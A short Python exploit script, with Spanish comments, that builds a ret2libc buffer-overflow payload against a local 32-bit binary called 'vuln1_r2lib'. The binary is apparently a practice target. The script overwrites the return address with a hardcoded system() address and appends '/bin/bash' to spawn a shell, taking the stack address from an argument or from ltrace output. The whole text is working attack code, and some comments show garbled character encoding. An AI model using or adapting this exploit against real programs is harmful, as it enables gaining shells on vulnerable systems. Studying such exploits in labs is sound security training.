#!/usr/bin/env python3
import struct
import sys
import subprocess
import re

offset = 88  # cc9c - cc44 -> 58 to decimal is 88
binbash_offset = 12 # system_addr + exit_addr + command_addr
junk = 0xDEADDEAD  # 0xF7DA4AD0  # exit()
system_addr = 0xF7DB8220

if len(sys.argv) > 1 and re.match(r"0x[0-9a-fA-F]+", sys.argv[1]):
    r_addr = int(sys.argv[1], 16)
else:
    r_addr = None  # si no se proporciona

if not r_addr:
    # Ejecutamos ltrace y capturamos la salida
    result = subprocess.run(
        ["ltrace", "./vuln1_r2lib"],
        input="patata\n",
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        text=True,
    )
    # ltrace escribe en stderr, no en stdout
    ltrace_output = result.stderr

    # Buscamos la primera aparici贸n de gets(...)
    match = re.search(r"gets\((0x[0-9a-fA-F]+)", ltrace_output)

    if match:
        addr_str = match.group(1)
        addr_int = int(addr_str, 16)
        addr_corr = addr_int + offset + binbash_offset
        binbash_addr = struct.pack("<I", addr_corr)
        # print(f"[+] Direcci贸n capturada: {addr_str}")
    else:
        print("[-] No se encontro la llamada a gets().")
        sys.exit(1)
else:
    r_addr = r_addr + 740 + 56  # Sumamos directamente el entero 804
    binbash_addr = struct.pack("<I", r_addr)

payload = b"A" * offset
payload += struct.pack("<I", system_addr)
payload += struct.pack("<I", junk)
payload += binbash_addr # Esta direcci贸n apunta a la siguiente de si misma, es decir, a la direcci贸n de la cadena "/bin/bash"
payload += b"/bin/bash"
sys.stdout.buffer.write(payload)